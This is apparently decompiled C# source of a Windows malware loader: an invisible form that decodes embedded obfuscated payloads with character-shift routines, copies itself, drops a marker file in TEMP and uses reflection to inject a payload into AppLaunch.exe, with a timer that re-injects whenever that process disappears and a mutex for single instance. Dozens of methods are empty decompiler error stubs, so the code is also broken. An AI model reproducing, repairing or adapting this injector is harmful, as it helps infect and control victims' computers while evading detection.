using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class GForm0 : Form
{
	public delegate object Owue9();

	public delegate byte[] fb6(string data);

	public delegate object lkjk9();

	public delegate object ty9(object S);

	public delegate OpCode Link9(string s);

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	public static int ttlcnt = 0;

	public static bool firstpass = true;

	public static int procCount = 0;

	public static byte[] byte_0;

	public static byte[] byte_1;

	public static byte[] B59;

	public StringBuilder sbsource;

	private string string_0;

	private string string_1;

	public static string roPP = "0";

	public static object object_0;

	internal static fb6 D = (fb6)Delegate.CreateDelegate(typeof(fb6), (MethodInfo)GClass0.aw98());

	public virtual _003F Timer_0
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick((EventHandler)Timer1_Tick);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick((EventHandler)Timer1_Tick);
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new GForm0());
	}

	public GForm0()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)GForm0_Load);
		Timer_0 = new Timer();
		sbsource = new StringBuilder();
		string_0 = "E";
		string_1 = "2";
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
	}

	public static object trimmit(string data, int key)
	{
		checked
		{
			key++;
			return data.Substring(0, data.Length - key);
		}
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		GClass0.smethod_1(Assembly.GetExecutingAssembly().Location, Path.GetFileName(Assembly.GetExecutingAssembly().Location));
		B59 = (byte[])smethod_1(smethod_3(RuntimeHelpers.GetObjectValue(GClass7.smethod_3()), "1"));
		byte_0 = (byte[])smethod_1(smethod_3(RuntimeHelpers.GetObjectValue(GClass3.smethod_0()), string_1));
		byte_1 = (byte[])smethod_1(GClass7.smethod_1(Conversions.ToString(GClass2.smethod_0()), "ùÉÈîÜÑä"));
		DTA9(new object[1] { string.Empty });
		lkwkw();
		if (!File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\87261KGSV.txt"))
		{
			File.WriteAllText(Environment.GetEnvironmentVariable("TEMP") + "\\87261KGSV.txt", "");
			try
			{
				int num = 0;
				do
				{
					num = checked(num + 1);
				}
				while (num <= 5);
				smethod_2(byte_1, new object[3]
				{
					Process.GetCurrentProcess().MainModule!.FileName,
					string.Empty,
					RuntimeHelpers.GetObjectValue(smethod_1(smethod_3(RuntimeHelpers.GetObjectValue(GClass5.smethod_0()), string_1)))
				}, "德儿贼へむくぃ", "德克艾西艾ぃと");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		((Timer)Timer_0).set_Interval(10);
		((Timer)Timer_0).Start();
	}

	public static void smethod_0()
	{
	}

	public static void lkwkw()
	{
		int num = 0;
		while (!Conversions.ToBoolean(smethod_2(byte_1, new object[3]
		{
			RuntimeEnvironment.GetRuntimeDirectory() + smethod_3("]BqqMbvodi/fyf", 1),
			string.Empty,
			byte_0
		}, "德儿贼へむくぃ", "德克艾西艾ぃと")))
		{
			num = checked(num + 1);
			if (num > 5)
			{
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		int num = 0;
		Process[] processes = Process.GetProcesses();
		checked
		{
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, Path.GetFileNameWithoutExtension("AppLaunch.exe"), false) == 0)
				{
					num++;
					if (firstpass)
					{
						ttlcnt++;
						firstpass = false;
					}
				}
			}
			if (num != ttlcnt)
			{
				ttlcnt = 0;
				num = 0;
				firstpass = false;
				lkwkw();
				Process[] processes2 = Process.GetProcesses();
				foreach (Process process2 in processes2)
				{
					if (Operators.CompareString(process2.ProcessName, Path.GetFileNameWithoutExtension("AppLaunch.exe"), false) == 0)
					{
						ttlcnt++;
						num++;
					}
				}
			}
			if (num == 0)
			{
				ttlcnt = 0;
				num = 0;
				firstpass = false;
				lkwkw();
				firstpass = true;
			}
			Mutex mutex = new Mutex(initiallyOwned: false, "jahsdhjjgaAWdawddawhasjSddDaETLY");
			if (!mutex.WaitOne(0, exitContext: false))
			{
				ProjectData.EndApp();
			}
		}
	}

	public static object smethod_1(string string_2)
	{
		return D(string_2);
	}

	public static string lw928(string w)
	{
		return smethod_3(w, "1");
	}

	public static object smethod_2(byte[] byte_2, object[] object_1, string string_2, string string_3)
	{
		return GClass4.type_0.InvokeMember("德克艾西艾ぃと", BindingFlags.InvokeMethod, null, null, object_1);
	}

	public static object DTA9(object object_1)
	{
		object obj = GClass7.smethod_0();
		object[] array = new object[5]
		{
			"德克艾西艾ぃと",
			BindingFlags.InvokeMethod,
			null,
			null,
			RuntimeHelpers.GetObjectValue(object_1)
		};
		bool[] array2 = new bool[5] { false, false, false, false, true };
		object result = NewLateBinding.LateGet(obj, (Type)null, "InvokeMember", array, (string[])null, (Type[])null, array2);
		if (array2[4])
		{
			object_1 = RuntimeHelpers.GetObjectValue(array[4]);
			return result;
		}
		return result;
	}

	public static string smethod_3(object object_1, object object_2)
	{
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2 = new StringBuilder();
		stringBuilder2.Append(RuntimeHelpers.GetObjectValue(object_1));
		int num = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(object_1, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1));
		for (int i = 0; i <= num; i = checked(i + 1))
		{
			object obj = Strings.Asc(stringBuilder2[i]);
			object obj2 = Operators.SubtractObject(obj, object_2);
			char value = Strings.ChrW(Conversions.ToInteger(obj2));
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	private void method_0()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_1()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_2()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_3()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_4()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_5()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_6()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_7()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_8()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_9()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_10()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_11()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_12()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_13()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_14()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_15()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_16()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_17()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_18()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_19()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_20()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_21()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_22()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_23()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_24()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_25()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_26()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_27()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_28()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_29()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_30()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_31()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_32()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_33()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_34()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_35()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_36()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_37()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_38()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_39()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_40()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_41()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_42()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_43()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_44()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_45()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_46()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_47()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_48()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_49()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_50()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_51()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_52()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_53()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_54()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_55()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_56()
	{
		/*Error: Unexpected end of block*/;
	}

	private void method_57()
	{
		/*Error: Unexpected end of block*/;
	}
}
